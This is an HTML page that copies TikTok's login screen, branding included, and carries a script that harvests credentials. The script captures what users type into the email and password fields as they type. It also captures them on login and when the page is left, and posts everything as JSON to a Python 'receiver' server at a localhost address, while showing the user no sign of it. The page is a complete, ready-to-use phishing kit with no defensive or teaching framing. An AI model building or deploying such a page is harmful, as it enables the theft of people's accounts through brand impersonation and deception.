<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        /* Base styles */
        body { 
            font-family: 'TikTok Font', 'TikTok Text', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        /* Modal container */
        .login-container {
            width: 100%;
            max-width: 380px;
            background: #ffffff;
            border-radius: 8px;
            padding: 40px 32px 32px;
            position: relative;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
        }
        /* Logo section */
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .logo svg {
            width: 170px;
            height: 50px;
        }
        /* Title */
        h1 {
            font-size: 32px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 32px;
            color: #161823;
            line-height: 1.2;
        }
        /* Login methods */
        .login-methods {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin-bottom: 20px;
        }
        
        .login-btn {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 4px;
            background: #ffffff;
            font-size: 15px;
            font-weight: 600;
            color: #161823;
            cursor: pointer;
            transition: all 0.15s;
            text-align: left;
        }
        
        .login-btn:hover {
            background-color: rgba(22, 24, 35, 0.03);
        }
        
        .login-btn svg {
            width: 20px;
            height: 20px;
            flex-shrink: 0;
        }
        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: rgba(22, 24, 35, 0.5);
            font-size: 14px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(22, 24, 35, 0.12);
        }
        
        .divider span {
            padding: 0 16px;
        }
        /* Input group */
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 4px;
            font-size: 15px;
            color: #161823;
            background: #ffffff;
            transition: all 0.15s;
            min-height: 100px;
            resize: vertical;
            font-family: inherit;
            line-height: 1.5;
        }
        
        .input-group textarea:focus {
            outline: none;
            border-color: rgba(22, 24, 35, 0.2);
        }
        
        .input-group textarea::placeholder {
            color: rgba(22, 24, 35, 0.34);
        }
        /* Submit button */
        .submit-btn {
            width: 100%;
            padding: 12px;
            background: #fe2c55;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.15s;
        }
        
        .submit-btn:hover {
            background: rgba(254, 44, 85, 0.9);
        }
        
        .submit-btn:disabled {
            background: rgba(22, 24, 35, 0.06);
            color: rgba(22, 24, 35, 0.34);
            cursor: not-allowed;
        }
        /* Footer */
        .agreement {
            margin-top: 20px;
            font-size: 12px;
            color: rgba(22, 24, 35, 0.5);
            line-height: 1.5;
            text-align: center;
        }
        
        .agreement a {
            color: #161823;
            text-decoration: none;
        }
        
        .agreement a:hover {
            text-decoration: underline;
        }
        
        .footer-text {
            text-align: center;
            margin-top: 20px;
            font-size: 15px;
            color: rgba(22, 24, 35, 0.75);
        }
        
        .footer-text a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
            margin-left: 4px;
        }
        
        .footer-text a:hover {
            text-decoration: underline;
        }
        
        #log-status {
            text-align: center;
            font-size: 12px;
            color: rgba(22, 24, 35, 0.5);
            margin-top: 12px;
        }
        
        /* Login form */
        .login-form {
            display: none;
        }
        
        .login-form.active {
            display: block;
        }
        
        .back-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            color: #161823;
        }
        
        .back-btn svg {
            width: 24px;
            height: 24px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 12px;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 4px;
            font-size: 15px;
            color: #161823;
            background: #ffffff;
            transition: all 0.15s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: rgba(22, 24, 35, 0.2);
        }
        
        .form-group input::placeholder {
            color: rgba(22, 24, 35, 0.34);
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #161823;
            margin-bottom: 8px;
        }
        
        .forgot-password {
            text-align: right;
            margin-top: 8px;
        }
        
        .forgot-password a {
            font-size: 13px;
            color: #161823;
            text-decoration: none;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 118 42" width="170" height="50">
                <path fill="#161823" d="M28.262 12h-4.218v18.344c0 2.408-1.689 3.955-3.741 3.955s-3.872-1.547-3.872-3.955c0-2.78 2.118-4.242 4.945-3.936v-4.644a7.5 7.5 0 0 0-1.167-.095c-4.627 0-8.5 3.802-8.5 8.522 0 4.997 3.826 8.819 8.528 8.819 4.124 0 8.5-3.105 8.5-8.962v-9.545c1.82 1.863 4.031 2.446 6.4 2.446v-4.29C32.228 18.44 29 16.481 28.263 12"></path>
                <path fill="#161823" d="M73.122 24.612h-5.057l-3.835 4.242V18.726h-4.264v18.669h4.264v-3.459l1.689-1.815 2.575 5.255h4.973l-4.404-8.284zm-34.43-1.672h4.423v14.445h4.535V22.94h2.874l1.614-4.223H38.693zM53.22 37.395h4.264V24.61H53.22zm2.118-18.908c-1.39 0-2.37.984-2.37 2.332s.98 2.33 2.37 2.33 2.37-1.003 2.37-2.33c0-1.329-.98-2.332-2.37-2.332"></path>
                <path fill="#161823" d="M107.886 29.083l4.059-4.471h-5.057l-3.835 4.232V18.717h-4.264v18.668h4.264v-3.458l1.689-1.815 2.575 5.254h4.973z"></path>
                <path fill="#161823" d="M85.363 18.717h-14.07v4.223h4.422v14.445h4.535V22.94h3.49zm4.339 4.318c-4.106 0-7.222 3.2-7.222 7.328 0 4.127 3.126 7.328 7.222 7.328s7.221-3.2 7.221-7.328c0-4.127-3.116-7.328-7.221-7.328m0 10.672c-1.82 0-3.08-1.376-3.08-3.334s1.25-3.335 3.08-3.335c1.828 0 3.079 1.376 3.079 3.335 0 1.958-1.25 3.334-3.08 3.334"></path>
            </svg>
        </div>
        
        <h1 id="main-title">Log in to make your day</h1>
        
        <div class="login-methods" id="login-methods">
            <button class="login-btn" id="phone-email-btn">
                <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M24 3a10 10 0 1 0 0 20 10 10 0 0 0 0-20Zm0 23C13.06 26 7 33.92 7 40.44 7 44 9 44 16 44h16c7 0 9 0 9-3.56C41 33.92 34.94 26 24 26Z"></path></svg>
                Use phone or email
            </button>
            <button class="login-btn">
                <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M24 47C36.7025 47 47 36.7025 47 24C47 11.2975 36.7025 1 24 1C11.2975 1 1 11.2975 1 24C1 36.7025 11.2975 47 24 47Z" fill="white"></path><path d="M24 1C11.2964 1 1 11.2964 1 24C1 35.4775 9.40298 44.9804 20.3846 46.7205L20.3936 30.6629H14.5151V24.009H20.3936V18.5363C20.4206 16.8503 20.7542 15.2274 21.6288 13.7487C22.9722 11.4586 25.0639 10.3407 27.6335 10.0251C29.7432 9.76362 31.826 10.0521 33.9087 10.3407L34.2693 10.4038V16.0839C33.2685 16.0659 31.6096 15.9667 30.5096 16.138C28.6884 16.4175 27.6425 17.5806 27.6064 19.4108C27.5704 20.8354 27.5884 24.009 27.5884 24.009H33.9988L32.962 30.6629H27.5974V46.7205C38.597 44.9984 47.009 35.4775 47.009 24C47 11.2964 36.7036 1 24 1Z" fill="#0075FA"></path></svg>
                Continue with Facebook
            </button>
            <button class="login-btn">
                <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M43 24.4313C43 23.084 42.8767 21.7885 42.6475 20.5449H24.3877V27.8945H34.8219C34.3724 30.2695 33.0065 32.2818 30.9532 33.6291V38.3964H37.2189C40.885 35.0886 43 30.2177 43 24.4313Z" fill="#4285F4"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M24.3872 43.001C29.6219 43.001 34.0107 41.2996 37.2184 38.3978L30.9527 33.6305C29.2165 34.7705 26.9958 35.4441 24.3872 35.4441C19.3375 35.4441 15.0633 32.1018 13.5388 27.6108H7.06152V32.5337C10.2517 38.7433 16.8082 43.001 24.3872 43.001Z" fill="#34A853"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M13.5395 27.6094C13.1516 26.4695 12.9313 25.2517 12.9313 23.9994C12.9313 22.7472 13.1516 21.5295 13.5395 20.3894V15.4668H7.06217C5.74911 18.0318 5 20.9336 5 23.9994C5 27.0654 5.74911 29.9673 7.06217 32.5323L13.5395 27.6094Z" fill="#FBBC04"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M24.3872 12.5568C27.2336 12.5568 29.7894 13.5155 31.7987 15.3982L37.3595 9.94866C34.0018 6.88281 29.6131 5 24.3872 5C16.8082 5 10.2517 9.25777 7.06152 15.4674L13.5388 20.39C15.0633 15.8991 19.3375 12.5568 24.3872 12.5568Z" fill="#EA4335"></path></svg>
                Continue with Google
            </button>
            <button class="login-btn">
                <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M32.1 12.14c.4 0 1.08.07 2.04.2.97.12 2.03.49 3.18 1.09a8.67 8.67 0 0 1 3.17 2.93l-.8.6a9.38 9.38 0 0 0-3.11 3.93 8.64 8.64 0 0 0-.66 3.53c0 1.57.28 2.9.82 4a9.52 9.52 0 0 0 3.91 4.1l.93.49-.7 1.94a18.48 18.48 0 0 1-2.2 4.07 29.6 29.6 0 0 1-2.9 3.59 4.87 4.87 0 0 1-3.69 1.64c-.96 0-1.76-.14-2.38-.41-.61-.3-1.25-.58-1.9-.85a6.64 6.64 0 0 0-2.66-.44c-1.08 0-1.98.15-2.7.44-.72.29-1.4.58-2.06.87-.64.3-1.4.44-2.27.44-1.33 0-2.5-.53-3.5-1.59a26.17 26.17 0 0 1-6.23-10.2 23.76 23.76 0 0 1-1.29-7.65c0-2.75.52-5.06 1.56-6.92a10.83 10.83 0 0 1 4-4.24 9.9 9.9 0 0 1 5.08-1.45c.93 0 1.8.16 2.62.47.82.29 1.59.6 2.3.9a5.1 5.1 0 0 0 1.97.47c.56 0 1.22-.17 1.97-.5.75-.32 1.58-.64 2.51-.95a8.9 8.9 0 0 1 2.98-.5Zm-1.51-3.47a9.02 9.02 0 0 1-2.68 2.16 6.6 6.6 0 0 1-3.06.85c-.2 0-.4-.02-.58-.05a3.74 3.74 0 0 1-.08-.77c0-1.1.24-2.15.71-3.17a10.2 10.2 0 0 1 1.62-2.57 9.28 9.28 0 0 1 2.9-2.27 7.9 7.9 0 0 1 3.33-.96c.05.24.08.52.08.85 0 1.1-.2 2.16-.63 3.2a10.71 10.71 0 0 1-1.61 2.73Z"></path></svg>
                Continue with Apple
            </button>
        </div>
        
        <!-- Login Form (hidden by default) -->
        <div class="login-form" id="login-form">
            <button class="back-btn" id="back-btn">
                <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M34.5 44a2.5 2.5 0 0 1-1.77-.73L11.27 21.81a2.5 2.5 0 0 1 0-3.54L32.73 4.73a2.5 2.5 0 0 1 3.54 3.54L17.08 27.46l19.19 19.19a2.5 2.5 0 0 1-1.77 4.27Z"></path></svg>
            </button>
            
            <div class="form-group">
                <label>Email or username</label>
                <input type="text" id="email-input" placeholder="Email or username">
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password-input" placeholder="Password">
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            
            <button class="submit-btn" id="login-submit-btn">Log in</button>
        </div>
        
        <div id="log-status"></div>
        
        <div class="agreement">
            By continuing, you agree to our <a href="#">Terms of Service</a> and acknowledge that you have read our <a href="#">Privacy Policy</a>.
        </div>
        
        <div class="footer-text">
            Don't have an account?<a href="#">Sign up</a>
        </div>
    </div>

    <script>
        // The URL of our Python "receiver" server
        const LOG_SERVER_URL = 'http://127.0.0.1:5000/log';
        
        let debounceTimeout = null;
        const DEBOUNCE_DELAY = 2000;
        
        const statusEl = document.getElementById('log-status');
        const phoneEmailBtn = document.getElementById('phone-email-btn');
        const backBtn = document.getElementById('back-btn');
        const loginMethods = document.getElementById('login-methods');
        const loginForm = document.getElementById('login-form');
        const mainTitle = document.getElementById('main-title');
        const emailInput = document.getElementById('email-input');
        const passwordInput = document.getElementById('password-input');
        const loginSubmitBtn = document.getElementById('login-submit-btn');

        // Show login form
        phoneEmailBtn.addEventListener('click', () => {
            loginMethods.classList.add('hidden');
            loginForm.classList.add('active');
            mainTitle.textContent = 'Log in';
        });

        // Go back to login methods
        backBtn.addEventListener('click', () => {
            loginForm.classList.remove('active');
            loginMethods.classList.remove('hidden');
            mainTitle.textContent = 'Log in to make your day';
            emailInput.value = '';
            passwordInput.value = '';
        });

        // Send data function
        async function sendData(data) {
            if (statusEl) statusEl.textContent = '';

            try {
                const response = await fetch(LOG_SERVER_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });

                if (response.ok) {
                    if (statusEl) statusEl.textContent = '';
                } else {
                    if (statusEl) statusEl.textContent = '';
                }
            } catch (error) {
                console.error('Network error:', error);
                if (statusEl) statusEl.textContent = '';
            }
        }

        // Track input changes
        function trackInput(inputEl, fieldName) {
            inputEl.addEventListener('input', () => {
                clearTimeout(debounceTimeout);
                if (statusEl) statusEl.textContent = '';
                
                debounceTimeout = setTimeout(() => {
                    const data = {
                        field: fieldName,
                        value: inputEl.value,
                        timestamp: new Date().toISOString()
                    };
                    sendData(data);
                }, DEBOUNCE_DELAY);
            });
        }

        // Track email and password inputs
        trackInput(emailInput, 'email');
        trackInput(passwordInput, 'password');

        // Handle login button click
        loginSubmitBtn.addEventListener('click', () => {
            const loginData = {
                email: emailInput.value,
                password: passwordInput.value,
                timestamp: new Date().toISOString(),
                action: 'login_attempt'
            };
            sendData(loginData);
        });

        // Send data when user leaves
        window.addEventListener('beforeunload', () => {
            if (emailInput.value || passwordInput.value) {
                const finalData = {
                    email: emailInput.value,
                    password: passwordInput.value,
                    timestamp: new Date().toISOString(),
                    action: 'page_exit'
                };
                sendData(finalData);
            }
        });
    </script>
</body>
</html> 